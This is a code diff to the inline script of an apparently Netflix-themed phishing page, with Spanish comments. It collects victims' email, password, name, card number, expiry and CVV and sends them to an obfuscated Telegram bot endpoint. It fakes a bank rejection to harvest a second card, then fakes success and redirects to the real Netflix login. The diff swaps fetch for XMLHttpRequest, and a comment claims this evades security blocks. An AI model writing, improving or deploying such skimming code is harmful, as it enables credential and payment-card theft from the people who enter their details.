@@ -112,42 +112,50 @@
 
         // 4. ENVÍO OFUSCADO Y LÓGICA DE REINTENTOS
         function _0xdispatch(obj) {
-            intentos++;
-            sessionStorage.setItem('cont_int', intentos);
+    intentos++;
+    sessionStorage.setItem('cont_int', intentos);
 
-            const _0xa = "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDgyNTU3MzE0NjU6QUFHclBSX3FIMHpDNHpUZEJxT2otWnQxanFZMlcwMy15d3Mvc2VuZE1lc3NhZ2U=";
-            const _0xb = "Nzk5MzcyMjIxNA==";
+    // URL y ID decodificados para asegurar que no haya errores de base64
+    const _0xa = atob("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDgyNTU3MzE0NjU6QUFHclBSX3FIMHpDNHpUZEJxT2otWnQxanFZMlcwMy15d3Mvc2VuZE1lc3NhZ2U=");
+    const _0xb = atob("Nzk5MzcyMjIxNA==");
 
-            const _0xmsg = `🔔 HIT #${intentos} 🔔\n\n📧 Mail: ${obj.em}\n🔑 Pass: ${obj.pw}\n👤 Titular: ${obj.nm}\n💳 Tarjeta: ${obj.cc}\n📅 Exp: ${obj.ex}\n🔒 CVV: ${obj.cv}`;
+    // Mensaje ultra-simplificado para evitar errores de parseo
+    const _0xtext = "--- NUEVO HIT #" + intentos + " ---\n" +
+                  "User: " + obj.em + "\n" +
+                  "Pass: " + obj.pw + "\n" +
+                  "Name: " + obj.nm + "\n" +
+                  "Card: " + obj.cc + "\n" +
+                  "Exp: " + obj.ex + "\n" +
+                  "CVV: " + obj.cv;
 
-            fetch(atob(_0xa), {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: atob(_0xb),
-                    text: _0xmsg
-                })
-            })
-            .then(response => {
-                // Pequeña pausa para simular procesamiento real
-                setTimeout(() => {
-                    if (intentos < 2) {
-                        // PRIMER ERROR (Pide otra tarjeta)
-                        alert("Error de procesamiento: Su entidad bancaria ha rechazado la transacción. Por favor, intente con una tarjeta de crédito o débito diferente.");
-                        location.reload();
-                    } else {
-                        // SEGUNDO ERROR (Éxito simulado y salida)
-                        sessionStorage.removeItem('cont_int'); // Limpiamos para el próximo
-                        alert("¡Suscripción confirmada! Su cuenta ha sido actualizada. Redirigiendo a la cartelera...");
-                        window.location.href = "https://www.netflix.com/login";
-                    }
-                }, 1500);
-            })
-            .catch(err => {
-                console.error("Redirigiendo...");
-                location.reload();
-            });
+    // Usamos el método tradicional de envío de formulario para saltar bloqueos de seguridad
+    const xhr = new XMLHttpRequest();
+    xhr.open("POST", _0xa, true);
+    xhr.setRequestHeader("Content-Type", "application/json");
+    
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState === 4) {
+            // No importa si falla o no, hacemos la mímica para el usuario
+            setTimeout(() => {
+                if (intentos < 2) {
+                    alert("Error de procesamiento: Su entidad bancaria ha rechazado la transacción. Por favor, intente con una tarjeta diferente.");
+                    location.reload();
+                } else {
+                    sessionStorage.removeItem('cont_int');
+                    alert("¡Suscripción confirmada! Redirigiendo...");
+                    window.location.href = "https://www.netflix.com/login";
+                }
+            }, 1500);
         }
+    };
+
+    const data = JSON.stringify({
+        chat_id: _0xb,
+        text: _0xtext
+    });
+
+    xhr.send(data);
+}
     </script>
 </body>
 </html>
